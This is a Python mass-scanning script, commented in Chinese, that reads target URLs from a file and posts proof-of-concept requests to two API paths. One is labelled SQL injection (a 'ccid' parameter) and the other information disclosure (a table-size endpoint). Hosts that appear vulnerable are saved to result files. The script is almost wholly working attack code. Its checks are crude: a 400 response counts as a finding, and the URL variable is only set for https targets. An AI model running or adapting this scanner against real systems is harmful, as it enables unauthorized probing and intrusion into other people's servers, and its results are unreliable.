import requests

urls = open('url.txt')
s = ''
for i in urls:
    url = i.rstrip("\n")
    if 'https' in url:
        s = url.replace('https','http')
    #sql注入漏洞
    poc = '/api/dp/rptsvcsyncpoint?ccid=1'
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }

    vulnurl = s + poc
    try:
        req = requests.post(vulnurl,headers=headers, timeout=3, verify=False)

        if req.status_code == 400:
            print("\n\033[1;32m[+]存在sql注入漏洞\tpayload:\033[0m",vulnurl)
            with open('sql注入.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("\n\033[1;31m[-]不存在漏洞\033[0m",vulnurl)
    except:
        print('\n\033[1;31m[-]响应超时..............\033[0m')
        pass

    #敏感信息泄露
    poc = '/api/dbstat/gettablessize'
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    vulnurl = s + poc
    try:
        req = requests.post(vulnurl, timeout=10, verify=False)
        if req.status_code == 400:
            if 'result":0,"reason":"success' in req.text:
                print("\n\033[1;32m[+]存在敏感信息泄露\tpayload:\033[0m", vulnurl)
                with open('敏感信息泄露.txt', 'a')as f:
                    f.write(str(vulnurl) + '\n')
            else:
                print("\n\033[1;31m[-]不存在漏洞\033[0m", vulnurl)
        else:
            print("\n\033[1;31m[-]不存在漏洞\033[0m", vulnurl)
    except:
        print('\n\033[1;31m[-]响应超时..............\033[0m')
        pass


